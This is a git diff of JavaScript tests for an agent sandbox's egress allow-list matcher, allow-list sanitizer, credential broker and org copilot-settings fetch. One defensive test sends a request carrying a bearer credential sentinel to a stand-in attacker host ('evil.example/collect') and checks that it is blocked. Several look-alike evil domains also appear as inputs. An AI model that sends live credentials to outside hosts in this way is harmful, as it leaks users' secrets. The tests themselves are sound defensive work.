@@ -53,14 +53,19 @@ import {
   sweepOrphanedBackups,
 } from '../core/src/backup.js';
 import {
+  brokerEgress,
   egressSecretForHost,
   ensureEgressPolicy,
   injectAndForward,
+  isAllowedEgressUrl,
+  ORG_ALLOWLIST_MAX_ENTRIES,
   putContainerPointer,
   resolveEgressPolicy,
+  sanitizeAllowlist,
 } from '../core/src/egress.js';
 import {
   extractSessionCookie,
+  fetchCopilotSettings,
   verifySemantiusCookie,
   SESSION_JWT_KEY_PREFIX,
 } from '../core/src/identity.js';
@@ -328,6 +333,111 @@ await (async function run() {
     'ensureEgressPolicy preserves an existing egress_secrets map verbatim',
     (await readSession(skv2, 'sess-n'))?.egress_secrets?.['postman-echo.com'] === 'vault-resolved-1',
   );
+
+  // --- The allow-list matcher ---------------------------------------------
+  // One grammar for the agent's proxy_whitelist and the org's copilot list:
+  // hostnames or URLs, `*` anywhere. The old exact-host/`*.suffix` behavior has
+  // to survive verbatim (those entries are deployed), so the look-alike cases
+  // are asserted first.
+  const allows = (url, ...list) => isAllowedEgressUrl(url, list);
+  check('exact host matches', allows('https://abc.com/x', 'abc.com'));
+  check('exact host does not match a different host', !allows('https://evil.com/x', 'abc.com'));
+  check('*.suffix matches a subdomain', allows('https://tests.semantius.ai/q', '*.semantius.ai'));
+  check('*.suffix does NOT match the bare apex', !allows('https://semantius.ai/q', '*.semantius.ai'));
+  check('*.suffix does NOT match a look-alike', !allows('https://evil-semantius.ai/q', '*.semantius.ai'));
+  check('*.suffix does NOT match a deeper impostor', !allows('https://tests.semantius.ai.evil.com/q', '*.semantius.ai'));
+  check('a wildcard in the middle matches', allows('https://api.eu.acme.io/v1', 'api.*.acme.io'));
+  check('a host pattern ignores the port', allows('https://abc.com:8443/x', 'abc.com'));
+  check('a host pattern ignores the path', allows('https://abc.com/any/deep/path?q=1', 'abc.com'));
+  check('host matching is case-insensitive', allows('https://ABC.com/x', 'abc.com'));
+  check('a bare * matches everything', allows('https://anything.example/deep?q=1', '*'));
+  check('an empty list denies', !isAllowedEgressUrl('https://abc.com/', []));
+  check('a URL pattern matches its path', allows('https://xxx/abc.com/deep', 'https://xxx/abc.com/*'));
+  check('a URL pattern does NOT match a different path', !allows('https://xxx/other', 'https://xxx/abc.com/*'));
+  check('a URL pattern tolerates a query string', allows('https://api.acme.io/v1/x?q=1', 'https://api.acme.io/v1/*'));
+  check('a URL pattern can pin a query string', allows('https://api.acme.io/s?q=cats', 'https://api.acme.io/s?q=*'));
+  check('a scheme-less URL pattern matches https', allows('https://x.com/abc/1', 'x.com/abc/*'));
+  check('a scheme-less URL pattern matches http', allows('http://x.com/abc/1', 'x.com/abc/*'));
+  check('a scheme-ful URL pattern pins the scheme', !allows('http://x.com/abc/1', 'https://x.com/abc/*'));
+  check('a URL pattern matches the site root', allows('https://acme.io/', 'https://acme.io'));
+  // An origin-only URL pattern means the WHOLE origin. Without this, the most
+  // natural entry anyone writes ("https://acme.io") allows the root document
+  // and denies every actual request — see the grammar note in egress.js.
+  check('an origin-only URL pattern covers every path under it', allows('https://acme.io/v1/x?q=1', 'https://acme.io'));
+  check('a trailing slash does not change an origin-only pattern', allows('https://acme.io/v1/x', 'https://acme.io/'));
+  check('a scheme-less origin-only pattern still pins nothing but the host', allows('http://acme.io/v1', 'http://acme.io'));
+  check('an origin-only pattern does NOT reach a look-alike host', !allows('https://acme.io.evil.com/v1', 'https://acme.io'));
+  check('an origin-only pattern does NOT reach a subdomain', !allows('https://api.acme.io/v1', 'https://acme.io'));
+  check('a wildcard host in an origin-only pattern does reach subdomains', allows('https://registry.npmjs.org/csv-parse/-/csv-parse-5.6.0.tgz', 'https://*.npmjs.org'));
+  check('an origin-only pattern still pins its scheme', !allows('http://acme.io/v1', 'https://acme.io'));
+  check('a URL pattern ignores the default port', allows('https://acme.io:443/v1', 'https://acme.io/v1'));
+  check('URL-pattern PATHS stay case-sensitive (an allow list must not over-match)', !allows('https://x.com/api', 'x.com/API'));
+  check('a URL pattern does not leak across hosts', !allows('https://evil.com/abc/1', 'x.com/abc/*'));
+  check('an unparseable URL matches nothing, not even *', !isAllowedEgressUrl('not a url', ['*']));
+  check('regex metacharacters in a pattern are literal', !allows('https://axbxc.com/', 'a.b.c.com'));
+
+  // sanitizeAllowlist guards the ONE list that comes from outside this repo.
+  // Dropping (never throwing) keeps a malformed upstream row from turning into
+  // a failed session — and can only ever narrow egress.
+  check('sanitizeAllowlist keeps good entries, trims, dedupes', JSON.stringify(sanitizeAllowlist(['a.com', ' a.com ', 'b.com'])) === '["a.com","b.com"]');
+  check('sanitizeAllowlist drops non-strings and blanks', JSON.stringify(sanitizeAllowlist([42, null, '', '  ', 'a.com'])) === '["a.com"]');
+  check('sanitizeAllowlist drops entries with whitespace', JSON.stringify(sanitizeAllowlist(['a b.com'])) === '[]');
+  check('sanitizeAllowlist drops over-long entries', JSON.stringify(sanitizeAllowlist([`${'a'.repeat(256)}.com`])) === '[]');
+  check('sanitizeAllowlist caps the entry count', sanitizeAllowlist(Array.from({ length: 200 }, (_, i) => `h${i}.com`)).length === ORG_ALLOWLIST_MAX_ENTRIES);
+  check('sanitizeAllowlist tolerates a non-array', JSON.stringify(sanitizeAllowlist('a.com')) === '[]');
+
+  // --- Agent list + org list are unioned at READ time ----------------------
+  // The whole point of keeping them in two fields: ensureEgressPolicy rewrites
+  // the agent half from the bundle on every message and has no cookie to
+  // re-read the org half with, so a pre-merged field would lose it on turn two.
+  const unionKv = fakeKv();
+  await mergeSessionRecord(unionKv, 'sess-m', { whitelist: ['agent.example'], org_whitelist: ['*.org.example'] });
+  await putContainerPointer(unionKv, 'cid-m', 'sess-m');
+  const unioned = await resolveEgressPolicy(unionKv, 'cid-m');
+  check('resolveEgressPolicy unions the agent and org lists', JSON.stringify(unioned?.whitelist) === '["agent.example","*.org.example"]');
+  await ensureEgressPolicy(unionKv, 'cid-m', 'sess-m', { whitelist: ['agent.example'] });
+  const afterHeal = await resolveEgressPolicy(unionKv, 'cid-m');
+  check(
+    'the self-heal rewrites the agent half and leaves org_whitelist intact',
+    JSON.stringify(afterHeal?.whitelist) === '["agent.example","*.org.example"]',
+    JSON.stringify(afterHeal?.whitelist),
+  );
+  const fkv = fakeKv();
+  await mergeSessionRecord(fkv, 'sess-f', { whitelist: [], org_whitelist: ['*'] });
+  await putContainerPointer(fkv, 'cid-f', 'sess-f');
+  const wideOpen = await resolveEgressPolicy(fkv, 'cid-f');
+  check('an org with the firewall OFF reaches anything', isAllowedEgressUrl('https://anywhere.example/x', wideOpen?.whitelist ?? []));
+  const nkv = fakeKv();
+  await mergeSessionRecord(nkv, 'sess-x', { whitelist: [] });
+  await putContainerPointer(nkv, 'cid-x', 'sess-x');
+  check(
+    'a record with no org_whitelist at all is still deny-all (bearer sessions)',
+    (await resolveEgressPolicy(nkv, 'cid-x'))?.whitelist.length === 0,
+  );
+
+  // --- The credential scope does NOT widen with the allow list -------------
+  // A firewall-off org makes everything reachable. The user's Semantius JWT
+  // must still only travel to Semantius hosts, or `*` would turn the sandbox
+  // into an exfiltration channel for a live credential.
+  const sentinel = '__sak__';
+  const brokerPolicy = { whitelist: ['*'], sentinel, secret: 'real-jwt', secretHosts: ['*.semantius.ai'] };
+  let sent = null;
+  const swapCapture = async (req) => { sent = req; return new Response('ok'); };
+  await brokerEgress(new Request('https://tests.semantius.ai/mcp', { headers: { authorization: `Bearer ${sentinel}` } }), brokerPolicy, swapCapture);
+  check('the sentinel is still swapped inside the credential scope', sent?.headers.get('authorization') === 'Bearer real-jwt');
+  sent = null;
+  const offScope = await brokerEgress(
+    new Request('https://evil.example/collect', { headers: { authorization: `Bearer ${sentinel}` } }),
+    brokerPolicy,
+    swapCapture,
+  );
+  check('a sentinel aimed OUTSIDE the credential scope is 403, never forwarded', offScope.status === 403 && sent === null);
+  sent = null;
+  const plain = await brokerEgress(new Request('https://evil.example/ok'), brokerPolicy, swapCapture);
+  check('the same reachable host is fine WITHOUT the sentinel (403 is about the credential)', plain.status === 200 && sent !== null);
+  sent = null;
+  const notReachable = await brokerEgress(new Request('https://nope.example/x'), { ...brokerPolicy, whitelist: ['abc.com'] }, swapCapture);
+  check('a non-whitelisted host is still denied first', notReachable.status === 403 && sent === null);
 
   // --- Tenant-prefixed session ids ---------------------------------------
   // The id is what the tenant scoping of the whole key space rests on, and the
@@ -761,6 +871,65 @@ await (async () => {
 
   const kvless = await verifySemantiusCookie(COOKIE, { exchangeKey: 'xk' }, fakeUpstream().fetchImpl);
   check('no KV bound -> still verifies, just uncached', kvless.ok === true && kvless.jwt === JWT);
+
+  // --- POST /session/copilot: the ORG's settings -------------------------
+  // Read once at session creation, not on the auth path. The two booleans
+  // decide whether a session may exist at all and how wide its egress is, so
+  // every ambiguous answer has to land on the RESTRICTIVE reading.
+  console.log('\n== org copilot settings ==');
+
+  /** Fake /session/copilot, recording every call. */
+  function fakeCopilot(body, status = 200) {
+    const calls = [];
+    const fetchImpl = async (url, init = {}) => {
+      calls.push({ url, init });
+      return new Response(typeof body === 'string' ? body : JSON.stringify(body), { status });
+    };
+    return { calls, fetchImpl };
+  }
+  const copilotOptions = { baseUrl: 'https://api.semantius.cloud', exchangeKey: 'xk' };
+
+  const cop = fakeCopilot({ copilotEnabled: true, copilotFirewallEnabled: true, copilotFirewallAllowlist: ['example.com', 'api.acme.io'] });
+  const settings = await fetchCopilotSettings(COOKIE, copilotOptions, cop.fetchImpl);
+  check('copilot settings are read', settings.ok === true, settings.error ?? '');
+  check('the endpoint is POST /session/copilot', cop.calls[0].url === 'https://api.semantius.cloud/session/copilot' && cop.calls[0].init.method === 'POST');
+  check('it sends the exchange api key', cop.calls[0].init.headers['x-jwt-exchange-api-key'] === 'xk');
+  check('it sends the cookie VALUE in the body', JSON.parse(cop.calls[0].init.body).sessionCookie === COOKIE);
+  check('the allow list comes back sanitized', JSON.stringify(settings.allowlist) === '["example.com","api.acme.io"]');
+  check('enabled + firewallEnabled are surfaced', settings.enabled === true && settings.firewallEnabled === true);
+
+  const off = await fetchCopilotSettings(COOKIE, copilotOptions, fakeCopilot({ copilotEnabled: true, copilotFirewallEnabled: false, copilotFirewallAllowlist: [] }).fetchImpl);
+  check('a disabled firewall is reported as such (the caller turns it into *)', off.ok === true && off.firewallEnabled === false);
+
+  const disabled = await fetchCopilotSettings(COOKIE, copilotOptions, fakeCopilot({ copilotEnabled: false, copilotFirewallEnabled: true, copilotFirewallAllowlist: [] }).fetchImpl);
+  check('copilotEnabled:false comes back as not-enabled', disabled.ok === true && disabled.enabled === false);
+
+  const empty = await fetchCopilotSettings(COOKIE, copilotOptions, fakeCopilot({}).fetchImpl);
+  check('an EMPTY body is not enabled (restrictive default)', empty.ok === true && empty.enabled === false);
+  check('an empty body is FIREWALLED (restrictive default)', empty.firewallEnabled === true && empty.allowlist.length === 0);
+
+  const stringy = await fetchCopilotSettings(COOKIE, copilotOptions, fakeCopilot({ copilotEnabled: 'true', copilotFirewallEnabled: 'false' }).fetchImpl);
+  check('stringy booleans are not truthy-coerced', stringy.enabled === false && stringy.firewallEnabled === true);
+
+  const dirty = await fetchCopilotSettings(COOKIE, copilotOptions, fakeCopilot({ copilotEnabled: true, copilotFirewallAllowlist: ['ok.com', 42, 'bad host', 'ok.com'] }).fetchImpl);
+  check('junk entries are dropped, not fatal', dirty.ok === true && JSON.stringify(dirty.allowlist) === '["ok.com"]');
+
+  const forbidden = await fetchCopilotSettings(COOKIE, copilotOptions, fakeCopilot({ error: 'nope' }, 403).fetchImpl);
+  check('a 403 is a verdict carrying the status', forbidden.ok === false && forbidden.status === 403);
+
+  const notJson = await fetchCopilotSettings(COOKIE, copilotOptions, fakeCopilot('<html>oops</html>').fetchImpl);
+  check('a non-JSON 200 is rejected, never read as enabled', notJson.ok === false);
+
+  const unreachable = await fetchCopilotSettings(COOKIE, copilotOptions, async () => { throw new Error('boom'); });
+  check('a network failure is a verdict, not a throw', unreachable.ok === false && unreachable.error.includes('unreachable'));
+
+  const noCopilotKey = fakeCopilot({ copilotEnabled: true });
+  const keyless = await fetchCopilotSettings(COOKIE, { baseUrl: 'https://api.semantius.cloud' }, noCopilotKey.fetchImpl);
+  check('no exchange key bound -> rejected without a network call', keyless.ok === false && noCopilotKey.calls.length === 0);
+
+  const badCookie = fakeCopilot({ copilotEnabled: true });
+  const malformedCookie = await fetchCopilotSettings('has space; and semi', copilotOptions, badCookie.fetchImpl);
+  check('a malformed cookie never reaches the network', malformedCookie.ok === false && badCookie.calls.length === 0);
 })();
 
 console.log(`\n${failures === 0 ? 'ALL PASS' : `${failures} FAILED`}  (${total} checks)`);
